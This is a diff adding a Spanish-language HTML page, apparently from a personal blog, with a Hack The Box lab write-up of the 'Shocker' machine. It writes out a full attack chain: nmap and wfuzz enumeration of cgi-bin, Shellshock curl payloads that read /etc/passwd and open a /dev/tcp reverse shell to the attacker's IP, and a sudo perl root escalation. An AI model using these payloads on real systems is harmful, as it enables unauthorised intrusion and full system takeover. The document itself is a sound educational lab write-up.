@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Shocker | HTB</title>
+
+    <!-- Estilos principales -->
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <!-- Fuente y resaltado de código -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+</head>
+<body class="glitch-bg">
+  <nav class="navbar">
+    <ul class="nav-list">
+      <li><a href="../index.html">Inicio</a></li>
+      <li><a href="../projects.html">Proyectos</a></li>
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../notes.html">Notas</a></li>
+      <li><a href="../writeups.html">Writeups</a></li>
+      <li><a href="../about.html">Sobre mí</a></li>
+      <li><a href="../contact.html">Contacto</a></li>
+    </ul>
+  </nav>
+
+  <main class="blog-container">
+    <section class="blog-post">
+      <div class="terminal-box">
+        <a href="../writeups.html">← Volver a Writeups</a>
+        <h1></h1>
+        <h1>Shocker // Linux // Easy // HTB</h1>
+
+        
+        <div class="img-placeholder">
+          <img src="../assets/img/writeups/shocker/shocker_banner.png" alt="Shocker - placeholder">
+        </div>
+        <br>
+
+        <article>
+
+          <!-- === PRIMERA SECCIÓN: Instalación y configuración de BSPWM === -->
+          <section id="Conceptos-basicos-snmp">
+            <h2>Fase de reconocimiento</h2>
+            <br>  
+            <p>Primero procedo a hacer un análisis de puertos con nmap hacia el servidor:</p>
+             <br>
+            <pre><code class="bash">nmap -sS -p- --open 10.129.57.156 -Pn -oN Ports</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sS:</strong> Especifico el uso de un escaneo SYN (half-open)</li>
+                <li><strong style="color: aquamarine;">-p-:</strong> Indico que quiero escanear todo el rango de puertos</li>
+                <li><strong style="color: aquamarine;">--open:</strong> Esto me filtra solo por los puertos abiertos</li>
+                <li><strong style="color: aquamarine;">-Pn:</strong> Esto hace que no haga ping por lo que acelera el escaneo</li>
+                <li><strong style="color: aquamarine;">-oN Ports:</strong> Guarda el resultado del escaneo en un archivo llamado Ports, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+           
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_nmap1.png" alt="Shocker - Nmap puertos">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que solo el puerto 80 y el 2222 están abiertos, por lo que procedo a hacer un escaneo más profundo en estos puertos:</p>
+            <br>
+            <pre><code class="bash">nmap -sCV -p 80,2222 10.129.57.156 -oN Versions</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sCV:</strong> Especifico que quiero hacer un escaneo de scripts básicos de Nmap (C) y de versiones (V)</li>
+                <li><strong style="color: aquamarine;">-p 80,2222:</strong> Indico que quiero escanear solo los puertos 80 y 2222</li>
+                <li><strong style="color: aquamarine;">-oN Versions:</strong> Guarda el resultado del escaneo en un archivo llamado Versions, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_nmap2.png" alt="Shocker - Nmap versiones">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que el puerto 80 tiene un servidor Apache 2.4.18 y el puerto 2222 tiene un servicio SSH, por lo que procedo a revisar el puerto 80 para hacer un reconocimiento más detallado de la página web.</p>
+            <p>Dentro de la página web, no se ve nada más que una imagen y un texto diciendo Don´t Bug Me!</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_web.png" alt="Shocker - Página web">
+            </div>
+            <br>
+            <h2>Enumeración de directorios</h2>
+            <p>Para la enumeración de directorios utilizo la herramienta wfuzz con el siguiente comando:</p>
+            <br>
+            <pre><code class="bash">wfuzz -c --hc 404 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.57.156/FUZZ/</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-c:</strong> Muestra el resultado con colores</li>
+                <li><strong style="color: aquamarine;">--hc 404:</strong> Indica que se deben ocultar las respuestas con código 404 (Not Found)</li>
+                <li><strong style="color: aquamarine;">-t 50:</strong> Define el número de hilos a usar para el escaneo (50 en este caso)</li>
+                <li><strong style="color: aquamarine;">-w:</strong> Especifica la ruta del archivo de wordlist que se va a usar</li>
+                <li><strong style="color: aquamarine;">http://10.129.57.156/FUZZ:</strong> Especifica la URL base y el parámetro FUZZ que se va a usar para enumerar los directorios</li>
+            </ul>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_wfuzz.png" alt="Shocker - wfuzz">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que hay un directorio llamado cgi-bin, por lo que procedo a revisar ese directorio. Pero al ingresar a ese directorio, se muestra un mensaje de error que indica que no existe el directorio.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_cgi-bin.png" alt="Shocker - cgi-bin">
+            </div>
+            <br>
+            <p>Pero, al colocar un parámetro de URL como /cgi-bin/, el error cambia a un Forbidden (403). Esto demuestra que el directorio cgi-bin existe, pero no se puede acceder a él sin permisos adecuados.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_cgi-bin2.png" alt="Shocker - cgi-bin 403">
+            </div>
+            <br>
+            <p>cgi-bin (Common Gateway Interface) es un directorio comúnmente utilizado para alojar scripts CGI en servidores web.</p> 
+            <p>Estos scripts pueden ser escritos en varios lenguajes de programación, como Perl, Python o Bash, y se ejecutan en el servidor para generar contenido dinámico o realizar tareas específicas.</p> 
+            <p>La presencia de un directorio cgi-bin puede ser un indicio de que el servidor tiene vulnerabilidades relacionadas con la ejecución de scripts, lo que podría ser explotado por un atacante para obtener acceso no autorizado o ejecutar código malicioso.</p>
+            <p>Igualmente tengo esta sección en la cual explico un poco más sobre el funcionamiento de <a href="/notes/cgi-bin.html">cgi-bin</a>.</p>
+            <br>
+            <h2>Enumeración de archivos dentro del directorio cgi-bin</h2>
+            <p>Para la enumeración de archivos dentro del directorio cgi-bin, utilizo nuevamente la herramienta wfuzz con el siguiente comando:</p>
+            <br>
+            <pre><code class="bash">wfuzz -c --hc 404,403 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://10.129.57.156/cgi-bin/FUZZ.FUZ2Z</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-c:</strong> Muestra el resultado con colores</li>
+                <li><strong style="color: aquamarine;">--hc 404,403:</strong> Indica que se deben ocultar las respuestas con código 404 (Not Found) y 403 (Forbidden)</li>
+                <li><strong style="color: aquamarine;">-w:</strong> Especifica la ruta del archivo de wordlist que se va a usar</li>
+                <li><strong style="color: aquamarine;">-z list,sh-pl-cgi:</strong> Especifica que se va a usar una lista personalizada de palabras para la enumeración, en este caso, la lista sh-pl-cgi que contiene extensiones comunes de scripts CGI</li>
+                <li><strong style="color: aquamarine;">FUZZ.FUZ2Z:</strong> Especifica los parámetros FUZZ y FUZ2Z que se van a usar para enumerar los archivos dentro del directorio cgi-bin. haciendo que FUZ2Z se encargue de solo la enumeración de extensiones</li>
+            </ul>
+            <p>El resultado del escaneo muestra que hay un archivo llamado user.sh dentro del directorio cgi-bin.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_wfuzz2.png" alt="Shocker - wfuzz cgi-bin">
+            </div>
+            <br>
+            
+  
+            <h2>Explotación de la vulnerabilidad Shellshock</h2>
+            <br>
+            <p>La vulnerabilidad Shellshock, también conocida como Bashdoor, es una vulnerabilidad crítica en el shell Bash de Unix/Linux que permite a un atacante ejecutar comandos arbitrarios en un sistema vulnerable.</p>
+            <p>Esta vulnerabilidad fue descubierta en 2014 y afecta a muchas versiones de Bash.</p>
+            <p>Para explotar esta vulnerabilidad, un atacante puede enviar una solicitud HTTP especialmente diseñada a un servidor web que utiliza Bash para procesar solicitudes CGI.</p>
+            <p>Al incluir un comando malicioso en la variable de entorno de la solicitud, el atacante puede lograr que Bash ejecute ese comando cuando procesa la solicitud.</p>
+            <p>Según he estado investigando, cuando uno ve cosas de tipo CGI, uno puede uno ir pennsando en un ataque como shellshock: </p>
+                <ul>
+                   <li><a href="https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock/" target="_blank">exploiting CGI Scripts with Shellshock</a></li>
+                </ul>
+            <br>
+            <p>Para explotar la vulnerabilidad Shellshock en el archivo user.sh, utilizo la herramienta curl para enviar una solicitud HTTP especialmente diseñada al servidor web. El comando utilizado es el siguiente:</p>
+            <br>
+            <pre><code class="bash">curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.129.47.33/cgi-bin/user.sh</code></pre>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_shellshock.png" alt="Shocker - Shellshock exploit">
+            </div>
+            <br>
+            <p>El resultado del comando muestra el contenido del archivo /etc/passwd, lo que indica que la vulnerabilidad Shellshock ha sido explotada con éxito.</p>
+            <p>Con esta vulnerabilidad, puedo ejecutar comandos arbitrarios en el sistema, lo que me permitiría intentar conseguir acceso remoto al sistema</p>
+            <br>
+            <p>Antes de ejecutar el comando para obtener una reverse shell, me aseguro de tener configurado un listener en mi máquina atacante utilizando netcat con el siguiente comando:</p>
+            <br>    
+            <pre><code class="bash">nc -lvnp 4444</code></pre>
+            <br>
+            <p>Luego, ejecuto el siguiente comando para obtener una reverse shell hacia mi máquina atacante:</p>
+            <br>
+            <pre><code class="bash">curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'" http://10.129.47.33/cgi-bin/user.sh</code></pre>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_reverse_shell.png" alt="Shocker - Reverse shell">
+            </div>
+            <br>
+            <p>El resultado muestra que he obtenido una reverse shell con el usuario shelly, lo que me permite interactuar con el sistema de la víctima y continuar con la enumeraación interna para intentar escalar privilegios.</p>
+            <p>Durante la enumeración puedo ver que soy parte del grupo <a href="/notes/lxd-esc-priv.html">lxd</a>, lo cual es un indicio de que podría haber una vulnerabilidad relacionada con LXD que me permita escalar privilegios a root.</p>
+            <p>Pero, en este caso he decidido revisar el comando sudo -l para ver si el usuario shelly tiene permisos para ejecutar algún comando con privilegios elevados, y el resultado muestra que shelly puede ejecutar el comando /usr/bin/pearl conn permisos de root sin necesidad de contraseña.</p>
+            <br>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/shocker/shocker_shell.png" alt="Shocker - Shell interactiva">
+            </div>
+              <br>
+              <p>Con esta información, puedo hacer uso de la plataforma de <strong><a href="https://gtfobins.org/" target="_blank">GTFoBins</a></strong> para buscar como escalar privilegios con el comando pearl.</p>
+              <p>Según GTFoBins, puedo hacer uso del siguiente comando para escalar privilegios:</p>
+              <pre><code class="bash">perl -e 'exec "/bin/sh"'</code></pre>
+              <br>
+              <p>Al ejecutar este comando, obtengo una shell con privilegios de root, lo que me permite tener control total sobre el sistema y completar el objetivo de la máquina.</p>
+              <div class="img-placeholder">
+                <img src="../assets/img/writeups/shocker/shocker_root.png" alt="Shocker - Root shell">
+              </div>
+              <br>
+              <p>Con esto, he completado el writeup de la máquina Shocker de Hack The Box, demostrando cómo identificar y explotar la vulnerabilidad Shellshock para obtener acceso no autorizado al sistema, y luego escalar privilegios aprovechadnome del comando sudo para ejeccutar comandos como root.</p>
+              <br>
+              <p>C:\También pueden visitar el video explicativo de la máquina en mi canal de YouTube: <a href="https://www.youtube.com/watch?v=J--RVTDGTuo&t=2086s" target="_blank">Resolución de la Máquina Shocker | HTB</a></p>
+
+
+            </section>
+        </article>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
